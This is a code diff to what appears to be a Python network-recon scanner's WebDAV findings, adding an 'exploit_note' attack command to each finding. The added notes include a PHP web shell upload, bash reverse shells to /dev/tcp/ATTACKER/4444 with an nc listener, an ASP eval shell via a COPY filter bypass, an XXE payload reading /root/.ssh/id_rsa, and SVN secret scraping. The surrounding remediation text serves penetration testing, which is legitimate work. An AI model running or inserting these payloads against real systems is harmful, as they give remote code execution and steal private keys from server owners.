@@ -802,7 +802,13 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                     f"http://{h.ip}:{p.portid}{di['path']}",
                     "Cap Depth to 1 (Apache: DavDepthInfinity Off; nginx dav_ext: "
                     "cap depth; IIS: 'Allow Depth: infinity' unchecked).",
-                    ["CWE-548", "CWE-538"], kind="webdav_directory_enum"))
+                    ["CWE-548", "CWE-538"], kind="webdav_directory_enum",
+                    exploit_note=(
+                        "curl -sSk -X PROPFIND -H 'Depth: infinity' "
+                        "http://IP:PORT/webdav/ | grep -oE '<D:href>[^<]+' ; "
+                        "for h in $(above); do curl -sSk http://IP:PORT$h; "
+                        "done"),
+                    depth_tier="t1"))
 
             # Verb enum.
             verbs = (pr.get("verbs") or {}).get("statuses") or {}
@@ -819,7 +825,14 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                     f"curl -X MKCOL http://{h.ip}:{p.portid}/recce_dav_probe/",
                     "Restrict write verbs (MKCOL/COPY/MOVE/PUT/DELETE/PROPPATCH) to "
                     "authenticated principals; remove WebDAV where not needed.",
-                    ["CWE-650"], kind="webdav_verbs_enabled"))
+                    ["CWE-650"], kind="webdav_verbs_enabled",
+                    exploit_note=(
+                        "curl -sSk -X MKCOL http://IP:PORT/recce_probe/ ; "
+                        "curl -sSk -X PUT --data 'x' "
+                        "http://IP:PORT/recce_probe/x.txt ; curl -sSk "
+                        "http://IP:PORT/recce_probe/x.txt ; curl -sSk "
+                        "-X DELETE http://IP:PORT/recce_probe/x.txt"),
+                    depth_tier="t1"))
                 if verbs.get("MKCOL") == 201:
                     out.append(_finding(
                         "high",
@@ -830,7 +843,14 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                         f"curl -X MKCOL http://{h.ip}:{p.portid}/recce_dav_probe/",
                         "Deny MKCOL to unauthenticated users (or all users on a "
                         "read-only mount).", ["CWE-434", "CWE-650"],
-                        kind="webdav_mkcol_allowed"))
+                        kind="webdav_mkcol_allowed",
+                        exploit_note=(
+                            "curl -sSk -X MKCOL http://IP:PORT/recce_probe/ "
+                            "; curl -sSk -X PUT --data 'x' "
+                            "http://IP:PORT/recce_probe/x.txt ; curl -sSk "
+                            "http://IP:PORT/recce_probe/x.txt ; curl -sSk "
+                            "-X DELETE http://IP:PORT/recce_probe/x.txt"),
+                        depth_tier="t1"))
 
             # Anonymous PUT proof.
             anon = pr.get("anon_put") or {}
@@ -845,7 +865,13 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                     "Require authentication for PUT (or disable it entirely). If "
                     "the mount backs a web root, isolate it from any executable "
                     "handler mapping.",
-                    ["CWE-434", "CWE-306", "CWE-650"], kind="webdav_anon_put"))
+                    ["CWE-434", "CWE-306", "CWE-650"], kind="webdav_anon_put",
+                    exploit_note=(
+                        "curl -sSk -X PUT --data '<?php system($_GET[c]); "
+                        "?>' http://IP:PORT/webdav/s.php ; curl -sSk "
+                        "'http://IP:PORT/webdav/s.php?c=bash -c \"bash -i "
+                        ">& /dev/tcp/ATTACKER/4444 0>&1\"'"),
+                    depth_tier="t2"))
 
             # RCE.
             rce = pr.get("rce") or {}
@@ -863,7 +889,14 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                     "Remove WebDAV write access on any path that maps to a script "
                     "handler. Enforce authentication + a strict upload allowlist.",
                     ["CWE-434", "CWE-94", "CWE-78"] + extra_cwes,
-                    kind="webdav_put_rce"))
+                    kind="webdav_put_rce",
+                    exploit_note=(
+                        "nc -lvnp 4444 & curl -sSk -X PUT --data "
+                        "'<?php exec(\"bash -c \\\"bash -i >& "
+                        "/dev/tcp/ATTACKER/4444 0>&1\\\"\"); ?>' "
+                        "http://IP:PORT/webdav/rev.php ; curl -sSk "
+                        "http://IP:PORT/webdav/rev.php"),
+                    depth_tier="t2"))
 
             # COPY/MOVE upload-filter bypass.
             cpy = pr.get("copy_bypass") or {}
@@ -878,7 +911,14 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                     "Apply upload extension filtering AFTER canonicalisation, and "
                     "block COPY/MOVE across extension boundaries. On IIS 6.0, "
                     "patch MS17-010-adjacent WebDAV CVEs or disable the module.",
-                    ["CWE-434", "CWE-73"], kind="webdav_copy_bypass"))
+                    ["CWE-434", "CWE-73"], kind="webdav_copy_bypass",
+                    exploit_note=(
+                        "curl -sSk -X PUT --data '<%eval request(\"c\")%>' "
+                        "http://IP:PORT/x.txt ; curl -sSk -X COPY -H "
+                        "'Destination: http://IP:PORT/x.asp' "
+                        "http://IP:PORT/x.txt ; curl -sSk "
+                        "'http://IP:PORT/x.asp?c=whoami'"),
+                    depth_tier="t2"))
 
             # PROPFIND XXE.
             xxe = pr.get("xxe") or {}
@@ -894,7 +934,18 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                     f"--data-binary @xxe.xml http://{h.ip}:{p.portid}/",
                     "Disable external-entity resolution in the XML parser "
                     "(defusedxml / disallow-doctype-decl / SabreDAV upgrade).",
-                    ["CWE-611", "CWE-918"], kind="webdav_xxe"))
+                    ["CWE-611", "CWE-918"], kind="webdav_xxe",
+                    exploit_note=(
+                        "cat > xxe.xml <<'EOF'\n<?xml version=\"1.0\"?>"
+                        "<!DOCTYPE r [<!ENTITY x SYSTEM "
+                        "\"file:///root/.ssh/id_rsa\">]>"
+                        "<D:propfind xmlns:D=\"DAV:\"><D:prop>"
+                        "<D:displayname>&x;</D:displayname>"
+                        "</D:prop></D:propfind>\nEOF\n"
+                        "curl -sSk -X PROPFIND -H 'Content-Type: "
+                        "application/xml' --data-binary @xxe.xml "
+                        "http://IP:PORT/"),
+                    depth_tier="t2"))
 
             # Auth scheme (Basic over cleartext).
             schemes = pr.get("auth_schemes") or []
@@ -939,7 +990,13 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                     f"svn checkout http://{h.ip}:{p.portid}/",
                     "Require authentication on mod_dav_svn (AuthzSVNAccessFile); "
                     "restrict repository read to project members.",
-                    ["CWE-538", "CWE-527"], kind="webdav_svn_exposed"))
+                    ["CWE-538", "CWE-527"], kind="webdav_svn_exposed",
+                    exploit_note=(
+                        "svn checkout --non-interactive http://IP:PORT/ "
+                        "/tmp/svnrepo ; svn log /tmp/svnrepo | awk "
+                        "'/^r/{print $3}' | sort -u ; trufflehog "
+                        "filesystem /tmp/svnrepo"),
+                    depth_tier="t1"))
 
             # If: header bypass.
             ifb = pr.get("if_bypass") or {}
@@ -956,7 +1013,12 @@ def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
                     f"-H 'Depth: 0' http://{h.ip}:{p.portid}/",
                     "Upgrade IIS/mod_dav to a version where If:-header parsing "
                     "runs AFTER authentication; deny WebDAV entirely on public "
-                    "endpoints.", ["CWE-287", "CWE-284"], kind="webdav_if_header_bypass"))
+                    "endpoints.", ["CWE-287", "CWE-284"], kind="webdav_if_header_bypass",
+                    exploit_note=(
+                        "curl -sSk -X PROPFIND -H 'If: "
+                        "(<opaquelocktoken:x>)' -H 'Depth: infinity' "
+                        "http://IP:PORT/protected/"),
+                    depth_tier="t1"))
 
             # Sensitive hrefs pivot.
             if pr.get("sensitive"):
